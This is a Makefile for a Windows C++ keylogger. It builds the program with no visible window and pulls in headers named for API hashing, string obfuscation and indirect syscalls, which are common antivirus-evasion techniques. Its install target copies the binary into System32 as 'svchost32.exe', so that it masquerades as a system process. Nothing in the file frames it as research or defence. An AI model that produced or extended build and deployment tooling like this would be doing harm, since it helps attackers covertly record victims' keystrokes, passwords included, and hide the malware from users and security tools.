# Compiler
CXX = g++
WINDRES = windres

# Compiler flags
CXXFLAGS = -std=c++17 -Wall -Wextra -O2
LDFLAGS = -static -mwindows

# Target binary
TARGET = keylogger.exe
TARGET_DEBUG = keylogger_debug.exe

# Source files
SOURCES = main.cpp
HEADERS = Keylogger.h APIHashing.h StringObfuscation.h IndirectSyscalls.h

# Default target
all: release

# Release build (no console window)
release: $(SOURCES) $(HEADERS)
	@echo [*] Building release version (no console)...
	$(CXX) $(CXXFLAGS) $(LDFLAGS) -o $(TARGET) $(SOURCES)
	@echo [+] Build complete: $(TARGET)
	@echo [i] Size: $$(du -h $(TARGET) | cut -f1)

# Debug build (with console)
debug: $(SOURCES) $(HEADERS)
	@echo [*] Building debug version (with console)...
	$(CXX) $(CXXFLAGS) -static -o $(TARGET_DEBUG) $(SOURCES)
	@echo [+] Build complete: $(TARGET_DEBUG)

# Clean build artifacts
clean:
	@echo [*] Cleaning build artifacts...
	rm -f $(TARGET) $(TARGET_DEBUG) *.o
	@echo [+] Clean complete

# Run debug version
run-debug: debug
	@echo [*] Running debug version...
	./$(TARGET_DEBUG)

# Run release version
run: release
	@echo [*] Running release version...
	./$(TARGET)

# Install (copy to system directory - requires admin)
install: release
	@echo [*] Installing to C:\\Windows\\System32...
	@echo [!] This requires administrator privileges
	cp $(TARGET) /c/Windows/System32/svchost32.exe
	@echo [+] Installed as svchost32.exe

# Uninstall
uninstall:
	@echo [*] Removing from system directory...
	rm -f /c/Windows/System32/svchost32.exe
	@echo [+] Uninstalled

# Help
help:
	@echo Available targets:
	@echo   make          - Build release version (no console)
	@echo   make release  - Build release version (no console)
	@echo   make debug    - Build debug version (with console)
	@echo   make clean    - Remove build artifacts
	@echo   make run      - Build and run release version
	@echo   make run-debug - Build and run debug version
	@echo   make install  - Install to system directory (admin required)
	@echo   make uninstall - Remove from system directory
	@echo   make help     - Show this help message

.PHONY: all release debug clean run run-debug install uninstall help
